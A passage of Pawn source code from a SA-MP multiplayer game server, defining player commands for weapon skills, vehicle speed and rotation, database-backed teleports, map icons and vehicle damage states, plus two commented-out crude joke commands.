		format(strings, sizeof(strings), "7Admin %s has stopped the vote.", playername);
  		IRC_GroupSay(1, IRC_CHANNEL, strings);
		return 1;
	}
	return 1;
}

dcmd_skill(playerid,params[])
{
 	new idx,
	 	skilllevel,
	 	skillweapon = -1;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /skill <weaponID/NAME> 1/2");

	if (!IsNumeric(tmps2))
	{
	    for (new i = 0; i < sizeof(aWeaponNames); i++)
		{
	        if (i == 19 || i == 20 || i == 21)
			continue;

			if (strfind(aWeaponNames[i], tmps2, true) != -1)
			{
				skillweapon = i;
				break;
			}
		}
	} else skillweapon = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /skill <weaponID/NAME> 1/2");
	skilllevel = strval(tmps2);

	if (skilllevel == 1) skilllevel = 1;
	else if (skilllevel == 2) skilllevel = 999;
	else return SendErrorMessage(playerid, EMBED_WHITE, "/skill <weaponID/NAME> 1/2");

	switch(skillweapon)
	{
	    case 22: skillweapon = WEAPONSKILL_PISTOL;
	    case 23: skillweapon = WEAPONSKILL_PISTOL_SILENCED;
	    case 24: skillweapon = WEAPONSKILL_DESERT_EAGLE;
	    case 25: skillweapon = WEAPONSKILL_SHOTGUN;
	    case 26: skillweapon = WEAPONSKILL_SAWNOFF_SHOTGUN;
	    case 27: skillweapon = WEAPONSKILL_SPAS12_SHOTGUN;
	    case 28: skillweapon = WEAPONSKILL_MICRO_UZI;
	    case 29: skillweapon = WEAPONSKILL_MP5;
	    case 30: skillweapon = WEAPONSKILL_AK47;
	    case 31: skillweapon = WEAPONSKILL_M4;
		case 34: skillweapon = WEAPONSKILL_SNIPERRIFLE;

		default:
		{
			SendErrorMessage(playerid, EMBED_WHITE, "This weapon is not compatible with setting skills!");
 			SendClientMessage(playerid, COLOR_YELLOW, "Allowed weapons: Colt45, Silenced Pistol, Desert Eagle, all Shotguns, UZI, MP5, AK47, M4, Sniper Rifle");
			return 1;
		}
	}

	SetPlayerSkillLevel(playerid, skillweapon, skilllevel);
	return 1;
}

dcmd_movespeed(playerid,params[])
return dcmd_ms(playerid,params);

dcmd_ms(playerid,params[])
{
 	if (!IsPlayerDriver(playerid) && !IsPlayerAdminLevel(playerid, 4))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

 	new idx,
	 	Float:speed;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ms(movespeed) <Float:speed> [Premium users: higher speed available]");
	speed = floatstr(tmps2);

	if (IsVIP(playerid))
	{
		if (IsPlayerAdminLevel(playerid, 3))
		{
			if (speed > ADMIN_MAX_SPEED || speed < -ADMIN_MAX_SPEED)
			return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -100 to 100 ! [Premium users: increased speed from -5 to 5]");
		} else {
			if (speed > VIP_MAX_SPEED || speed < -VIP_MAX_SPEED)
			return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -1 to 1 ! [Premium users: increased speed from -5 to 5]");
			
			if (!AntiSpam(playerid, 2)) return 1;
		}
	} else {
	    speed = speed/10;
		if (speed > DEFAULT_MAX_SPEED || speed < -DEFAULT_MAX_SPEED)
		return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -10 to 10 ! [Premium users: increased speed from -50 to 50]");
		
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		Float:cX,
		Float:cY,
		Float:cZ,
		Float:DV,
		Float:multiple;

	if (!vID)
	{
	    GetPlayerVelocity(playerid, cX, cY, cZ);
		DV = floatsqroot(cX*cX + cY*cY + cZ*cZ);
		if (DV > 0)
		{
			multiple = ((speed + DV) / (DV));
			SetPlayerVelocity(playerid, cX*multiple, cY*multiple, cZ*multiple);
		} else return SendErrorMessage(playerid, EMBED_WHITE, "You must be moving in order to apply speed!");
	} else {
		GetVehicleVelocity(vID, cX, cY, cZ);
		DV = floatsqroot(cX*cX + cY*cY + cZ*cZ);
		if (DV > 0)
		{
			multiple = ((speed + DV) / (DV));
			SetVehicleVelocity(vID, cX*multiple, cY*multiple, cZ*multiple);
		} else return SendErrorMessage(playerid, EMBED_WHITE, "You must be moving in order to apply speed!");
	}
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[A-1] "EMBED_IVORY"%s has used /movespeed", playername);

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] > 0 && player[a][adminmsgs] == 1)
		SendClientMessage(a, COLOR_RED, strings);
	}
	format(logstring, sizeof(logstring), "[A-1] %s has used /movespeed", playername);
	printflog("ADM-MSG", logstring);
	return 1;
}

dcmd_setspeed(playerid,params[])
return dcmd_ss(playerid,params);

dcmd_ss(playerid,params[])
{
 	if (!IsPlayerDriver(playerid) && !IsPlayerAdminLevel(playerid, 4))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

 	new idx,
	 	Float:sX = 0.0,
	 	Float:sY = 0.0,
	 	Float:sZ = 0.0;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /ss(setspeed) <Float:speedX> <Float:speedY> <Float:speedZ> [Premium users: higher speed available]");
	sX = floatstr(tmps2);

	tmps2 = strtok(params, idx);
	if (strlen(tmps2) || IsNumeric(tmps2))
	sY = floatstr(tmps2);

	tmps2 = strtok(params, idx);
	if (strlen(tmps2) || IsNumeric(tmps2))
	sZ = floatstr(tmps2);

	if (IsVIP(playerid))
	{
		if (IsPlayerAdminLevel(playerid, 3))
		{
			if (sX > ADMIN_MAX_SPEED || sY > ADMIN_MAX_SPEED || sZ > ADMIN_MAX_SPEED || sX < -ADMIN_MAX_SPEED || sY < -ADMIN_MAX_SPEED || sZ < -ADMIN_MAX_SPEED)
			return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -100 to 100 ! [Premium users: increased speed from -5 to 5]");
		} else {
			if (sX > VIP_MAX_SPEED || sY > VIP_MAX_SPEED || sZ > VIP_MAX_SPEED || sX < -VIP_MAX_SPEED || sY < -VIP_MAX_SPEED || sZ < -VIP_MAX_SPEED)
			return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -1 to 1 ! [Premium users: increased speed from -5 to 5]");
			
			if (!AntiSpam(playerid, 2)) return 1;
		}
	} else {
 		sX = sX/10;
	    sY = sY/10;
	    sZ = sZ/10;
		if (sX > DEFAULT_MAX_SPEED || sY > DEFAULT_MAX_SPEED || sZ > DEFAULT_MAX_SPEED || sX < -DEFAULT_MAX_SPEED || sY < -DEFAULT_MAX_SPEED || sZ < -DEFAULT_MAX_SPEED)
		return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -10 to 10 ! [Premium users: increased speed from -50 to 50]");
		
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid);
	if (!vID) SetPlayerVelocity(playerid, sX, sY, sZ);
	else SetVehicleVelocity(vID, sX, sY, sZ);

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[A-1] "EMBED_IVORY"%s has used /setspeed", playername);

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] > 0 && player[a][adminmsgs] == 1)
		SendClientMessage(a, COLOR_RED, strings);
	}
	format(logstring, sizeof(logstring), "[A-1] %s has used /setspeed", playername);
	printflog("ADM-MSG", logstring);
	return 1;
}

dcmd_setrotation(playerid,params[])
return dcmd_sr(playerid,params);

dcmd_sr(playerid,params[])
{
 	if (!IsPlayerInAnyVehicle(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!IsPlayerDriver(playerid) && !IsPlayerAdminLevel(playerid, 4))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

 	new idx,
	 	Float:rX = 0.0,
	 	Float:rY = 0.0,
	 	Float:rZ = 0.0;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sr(setrotation) <Float:speedRotX> <Float:speedRotY> <Float:speedRotZ>");
	rX = floatstr(tmps2);

	tmps2 = strtok(params, idx);
	if (strlen(tmps2) || IsNumeric(tmps2))
	rY = floatstr(tmps2);

	tmps2 = strtok(params, idx);
	if (strlen(tmps2) || IsNumeric(tmps2))
	rZ = floatstr(tmps2);

	if (IsVIP(playerid))
	{
		if (IsPlayerAdminLevel(playerid, 3))
		{
			if (rX > ADMIN_MAX_SPEED || rY > ADMIN_MAX_SPEED || rZ > ADMIN_MAX_SPEED || rX < -ADMIN_MAX_SPEED || rY < -ADMIN_MAX_SPEED || rZ < -ADMIN_MAX_SPEED)
			return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -100 to 100 ! [Premium users: increased speed from -5 to 5]");
		} else {
			if (rX > VIP_MAX_SPEED || rY > VIP_MAX_SPEED || rZ > VIP_MAX_SPEED || rX < -VIP_MAX_SPEED || rY < -VIP_MAX_SPEED || rZ < -VIP_MAX_SPEED)
			return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -1 to 1 ! [Premium users: increased speed from -5 to 5]");

			if (!AntiSpam(playerid, 2)) return 1;
		}
	} else {
 		rX = rX/10;
	    rY = rY/10;
	    rZ = rZ/10;
		if (rX > DEFAULT_MAX_SPEED || rY > DEFAULT_MAX_SPEED || rZ > DEFAULT_MAX_SPEED || rX < -DEFAULT_MAX_SPEED || rY < -DEFAULT_MAX_SPEED || rZ < -DEFAULT_MAX_SPEED)
		return SendErrorMessage(playerid, EMBED_WHITE, "Speed is limited from -10 to 10 ! [Premium users: increased speed from -50 to 50]");

		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid);
	SetVehicleAngularVelocity(vID, rX, rY, rZ);

	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[A-1] "EMBED_IVORY"%s has used /setrotation", playername);

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	    if (IsPlayerConnected(a) && player[a][ADMIN] > 0 && player[a][adminmsgs] == 1)
		SendClientMessage(a, COLOR_RED, strings);
	}
	format(logstring, sizeof(logstring), "[A-1] %s has used /setrotation", playername);
	printflog("ADM-MSG", logstring);
	return 1;
}

dcmd_ptele(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_TELES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /ptele <teleID[1-100]>");
 	new pTeleID = strval(tmps2);

	new mysqlStr[81];
    format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_TELEPORTS" WHERE `teleport_id` = %d LIMIT 1", pTeleID);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_LoadPlayerTeleport", "ii", playerid, player[playerid][cinc]);
	return 1;
}

dcmd_pteleports(playerid,params[])
{
	#pragma unused params
	
	mysql_run_query(mysqlConnection, "SELECT * FROM "MYSQL_TABLE_TELEPORTS"", true, "QS_LoadPlayerTeleportList", "ii", playerid, player[playerid][cinc]);
	return 1;
}

dcmd_pms(playerid,params[])
{
	#pragma unused params

	if (player[playerid][disablepm] == 1)
	{
		player[playerid][disablepm] = 0;
	    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: All Private Messages will be allowed.");
	} else {
		player[playerid][disablepm] = 1;
	    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: All Private Messages will be blocked.");
	}
	return 1;
}

dcmd_icons(playerid,params[])
{
	#pragma unused params

	if (player[playerid][showicons] == 0)
	{
		player[playerid][showicons] = 1;
		SetPlayerMapIcon(playerid,49,822.6,-1590.3,13.5,7,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,50,-2570.1,245.4,10.3,7,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,51,2726.6,-2026.4,17.5,7,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,52,2080.3,2119.0,10.8,7,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,53,675.7,-496.6,16.8,7,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,54,-1805.7,943.2,24.8,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,55,2750.9,2470.9,11.0,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,56,2351.8,2529.0,10.8,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,57,2635.5,1847.4,11.0,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,58,2083.4,2221.0,11.0,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,59,-1719.1,1359.4,8.6,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,60,2330.2,75.2,31.0,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,61,203.2,-200.4,6.5,29,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,62,812.9,-1616.1,13.6,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,63,1199.1,-924.0,43.3,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,64,2362.2,2069.9,10.8,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,65,2469.5,2033.8,10.8,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,66,2172.9,2795.7,10.8,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,67,1875.3,2072.0,10.8,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,68,1161.5,2072.0,10.8,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,69,-2356.0,1009.0,49.0,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,70,-1913.3,826.2,36.9,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,71,-2335.6,-165.6,39.5,10,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,72,2397.8,-1895.6,13.7,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,73,2421.6,-1509.6,24.1,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,74,-2671.6,257.4,4.6,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,75,2392.4,2046.5,10.8,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,76,2844.5,2401.1,11.0,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,77,2635.5,1674.3,11.0,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,78,2105.7,2228.7,11.0,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,79,-2154.0,-2461.2,30.8,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,80,-1816.2,620.8,37.5,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,81,-1216.0,1831.4,45.3,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,82,172.73,1176.76,13.7,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,83,932.0,-1353.0,14.0,14,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,84,1971.7,-2036.6,13.5,39,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,85,2071.6,-1779.9,13.5,39,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,86,2094.6,2119.0,10.8,39,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,87,-2490.5,-40.1,39.3,39,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,88,1372.9,-1278.8,12.5,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,89,2400.5,-1978.4,13.5,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,90,-2626.6,209.4,4.9,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,91,2535.9,2083.5,10.8,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,92,2156.5,943.2,10.8,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,93,779.7,1874.3,4.9,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,94,-2092.7,-2463.8,30.6,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,95,240.0,-178.2,2.0,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,96,-1509.4,2611.8,58.5,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,97,-315.67,829.87,13.43,6,0,MAPICON_LOCAL);
		SetPlayerMapIcon(playerid,98,2332.9,63.6,31.0,6,0,MAPICON_LOCAL);
	    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: All map icons are now enabled.");
	} else {
		player[playerid][showicons] = 0;
		for (new i = 49; i < 99; i++)
		{
			RemovePlayerMapIcon(playerid, i);
		}
	    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: All map icons are now disabled.");
	}
	return 1;
}

dcmd_nofire(playerid,params[])
{
	#pragma unused params

	if (player[playerid][frozen] == 1)
	return 1;

	TogglePlayerControllable(playerid, 0);
	TogglePlayerControllable(playerid, 1);
	return 1;
}

/*dcmd_commissioner(playerid,params[])
{
	#pragma unused params

	if (mutedchat == true && !IsAdmin(playerid))
	return SendClientMessage(playerid, COLOR_RED, "The global chat has been muted.");

	if (IsPlayerMuted(playerid))
	return SendClientMessage(playerid, COLOR_RED, "* You are muted *");

	if (!AntiSpam(playerid, 5)) return 1;

	new cname[24];
	GetPlayerName(playerid, cname, sizeof(cname));
	if (!strcmp(cname, "Commissioner", true))
	{
	    switch(random(5))
	    {
			case 0: SendPlayerMessageToAll(playerid, "I am sexy bocc lol ok");
			case 1: SendPlayerMessageToAll(playerid, "I am sexy bocc in bed jumping and eating and piss in toilet");
			case 2: SendPlayerMessageToAll(playerid, "Never touch sexy bocc hes so sexy look at his eyes so blue and so fat");
			case 3: SendPlayerMessageToAll(playerid, "I come from the world sex bones sexy bocc");
			case 4: SendPlayerMessageToAll(playerid, "I am not a fish cod I am sexy bocc ok");
			case 5: SendPlayerMessageToAll(playerid, "Commander dress mask becuse sexy bocc farts hot like it comes near shit");
		}

		if (GetPlayerSkin(playerid) != 266) SetPlayerSkin(playerid, 266);
		return 1;
	}

	for (new i = 0; i < MAX_PLAYERS; i++)
	{
	    if (IsPlayerConnected(i))
	    {
	        GetPlayerName(i, cname, sizeof(cname));
	        if (!strcmp(cname, "Commissioner", true))
	        return SendPlayerMessageToAll(playerid, "Commissioner, are you sexy bocc?");
	    }
	}

	SendPlayerMessageToAll(playerid, "I wish Commissioner was here, I miss him. :(");
	return 1;
}*/

/*dcmd_papaxo(playerid,params[])
{
	#pragma unused params

	if (mutedchat == true && !IsAdmin(playerid))
	return SendClientMessage(playerid, COLOR_RED, "The global chat has been muted.");

	if (IsPlayerMuted(playerid))
	return SendClientMessage(playerid, COLOR_RED, "* You are muted *");

	if (!AntiSpam(playerid, 5)) return 1;

	new cname[24];
	GetPlayerName(playerid, cname, sizeof(cname));
	if (!strcmp(cname, "Papaxo_CDBG", true))
	{
	    switch(random(6))
	    {
			case 0: SendPlayerMessageToAll(playerid, "I love only taco's, but I like burritos");
			case 1: SendPlayerMessageToAll(playerid, "burritos and tacos?");
			case 2: SendPlayerMessageToAll(playerid, "è_é!? ");
			case 3: SendPlayerMessageToAll(playerid, "¬¬");
			case 4: SendPlayerMessageToAll(playerid, "._.");
			case 5: SendPlayerMessageToAll(playerid, "¿burrito?");
		}

		if (GetPlayerSkin(playerid) != 155) SetPlayerSkin(playerid, 155);
		return 1;
	}


	for (new i = 0; i < MAX_PLAYERS; i++)
	{
	    if (IsPlayerConnected(i))
	    {
	        GetPlayerName(i, cname, sizeof(cname));
	        if (!strcmp(cname, "Papaxo_CDBG", true))
	        return SendPlayerMessageToAll(playerid, "Papaxo, burritos and tacos?");
	    }
	}

	SendPlayerMessageToAll(playerid, "I wish Papaxo was here, I want burritos and tacos! :(");
	return 1;
}*/

dcmd_panels(playerid,params[])
{
 	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!AntiSpam(playerid, 2)) return 1;

 	new idx,
	 	panel1,
	 	panel2,
	 	panel3,
	 	panel4,
	 	panel5,
	 	panel6,
	 	panel7;

	tmps2 = strtok(params, idx);
	panel1 = strval(tmps2);
	if (!strlen(tmps2) || panel1 < 1 || panel1 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panels <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	panel2 = strval(tmps2);
	if (!strlen(tmps2) || panel2 < 1 || panel2 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panels <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	panel3 = strval(tmps2);
	if (!strlen(tmps2) || panel3 < 1 || panel3 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panels <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	panel4 = strval(tmps2);
	if (!strlen(tmps2) || panel4 < 1 || panel4 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panels <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	panel5 = strval(tmps2);
	if (!strlen(tmps2) || panel5 < 1 || panel5 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panels <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	panel6 = strval(tmps2);
	if (!strlen(tmps2) || panel6 < 1 || panel6 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panels <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	panel7 = strval(tmps2);
	if (!strlen(tmps2) || panel7 < 1 || panel7 > 3)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /panel <FrontLeft: 1-3> <FrontRight: 1-3> <RearLeft: 1-3> <RearRight: 1-3> <Windshield: 1-3> <FrontBumper: 1-3> <RearBumper: 1-3>");
		SendClientMessage(playerid, COLOR_WHITE, "[1: CrackedA, 2: CrackedB, 3: Destroyed]");
		return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		panels, doors, lights, tires;

	GetVehicleDamageStatus(vID, panels, doors, lights, tires);
	panels = encode_panels(panel1, panel2, panel3, panel4, panel5, panel6, panel7);
	UpdateVehicleDamageStatus(vID, panels, doors, lights, tires);
	return 1;
}

dcmd_doors(playerid,params[])
{
 	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!AntiSpam(playerid, 2)) return 1;

 	new idx,
	 	door1,
	 	door2,
	 	door3,
	 	door4;

	tmps2 = strtok(params, idx);
	door1 = strval(tmps2);
	if (!strlen(tmps2) || door1 < 0 || door1 > 4)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /doors <Bonnet: 0-4> <Boot: 0-4> <DriverDoor: 0-4> <PassengerDoor: 0-4>");
		SendClientMessage(playerid, COLOR_WHITE, "[0: Undamaged, 1: Swinging, 2: Damaged, 3: Damaged swinging, 4: Fell off]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	door2 = strval(tmps2);
	if (!strlen(tmps2) || door2 < 0 || door2 > 4)
   	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /doors <Bonnet: 0-4> <Boot: 0-4> <DriverDoor: 0-4> <PassengerDoor: 0-4>");
		SendClientMessage(playerid, COLOR_WHITE, "[0: Undamaged, 1: Swinging, 2: Damaged, 3: Damaged swinging, 4: Fell off]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	door3 = strval(tmps2);
	if (!strlen(tmps2) || door3 < 0 || door3 > 4)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /doors <Bonnet: 0-4> <Boot: 0-4> <DriverDoor: 0-4> <PassengerDoor: 0-4>");
		SendClientMessage(playerid, COLOR_WHITE, "[0: Undamaged, 1: Swinging, 2: Damaged, 3: Damaged swinging, 4: Fell off]");
		return 1;
	}

	tmps2 = strtok(params, idx);
	door4 = strval(tmps2);
	if (!strlen(tmps2) || door4 < 0 || door4 > 4)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /doors <Bonnet: 0-4> <Boot: 0-4> <DriverDoor: 0-4> <PassengerDoor: 0-4>");
		SendClientMessage(playerid, COLOR_WHITE, "[0: Undamaged, 1: Swinging, 2: Damaged, 3: Damaged swinging, 4: Fell off]");
		return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		panels, doors, lights, tires;

	GetVehicleDamageStatus(vID, panels, doors, lights, tires);
	doors = encode_doors(door1, door2, door3, door4, 0, 0); // last 2 params are not yet used -> still not synced
	UpdateVehicleDamageStatus(vID, panels, doors, lights, tires);
	return 1;
}

dcmd_lights(playerid,params[])
{
 	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!AntiSpam(playerid, 2)) return 1;

 	new idx,
	 	light1,
	 	light2,
	 	light3,
	 	light4;

	tmps2 = strtok(params, idx);
	light1 = strval(tmps2);
	if (!strlen(tmps2) || light1 < 0 || light1 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /lights <FrontLeft: 0/1> <RearLeft: 0/1> <FrontRight: 0/1> <RearRight: 0/1> [0: On, 1: off]");

	tmps2 = strtok(params, idx);
	light2 = strval(tmps2);
	if (!strlen(tmps2) || light2 < 0 || light2 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /lights <FrontLeft: 0/1> <RearLeft: 0/1> <FrontRight: 0/1> <RearRight: 0/1> [0: On, 1: off]");

	tmps2 = strtok(params, idx);
	light3 = strval(tmps2);
	if (!strlen(tmps2) || light3 < 0 || light3 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /lights <FrontLeft: 0/1> <RearLeft: 0/1> <FrontRight: 0/1> <RearRight: 0/1> [0: On, 1: off]");

	tmps2 = strtok(params, idx);
	light4 = strval(tmps2);
	if (!strlen(tmps2) || light4 < 0 || light4 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /lights <FrontLeft: 0/1> <RearLeft: 0/1> <FrontRight: 0/1> <RearRight: 0/1> [0: On, 1: off]");

	new vID = GetPlayerVehicleID(playerid),
		panels, doors, lights, tires;

	GetVehicleDamageStatus(vID, panels, doors, lights, tires);
	lights = encode_lights(light1, light2, light3, light4);
	UpdateVehicleDamageStatus(vID, panels, doors, lights, tires);
	return 1;
}

dcmd_tires(playerid,params[])
{
 	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	if (!AntiSpam(playerid, 2)) return 1;

 	new idx,
	 	tire1,
	 	tire2,
	 	tire3,
	 	tire4;

	tmps2 = strtok(params, idx);
	tire1 = strval(tmps2);
	if (!strlen(tmps2) || tire1 < 0 || tire1 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /tires <Frontleft: 0/1> <FrontRight: 0/1> <RearLeft: 0/1> <RearRight: 0/1> [0: Inflated, 1: Popped]");

	tmps2 = strtok(params, idx);
	tire2 = strval(tmps2);
	if (!strlen(tmps2) || tire2 < 0 || tire2 > 1)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /tires <Frontleft: 0/1> <FrontRight: 0/1> <RearLeft: 0/1> <RearRight: 0/1> [0: Inflated, 1: Popped]");

	tmps2 = strtok(params, idx);
	tire3 = strval(tmps2);
	if (!strlen(tmps2) || tire3 < 0 || tire3 > 1)
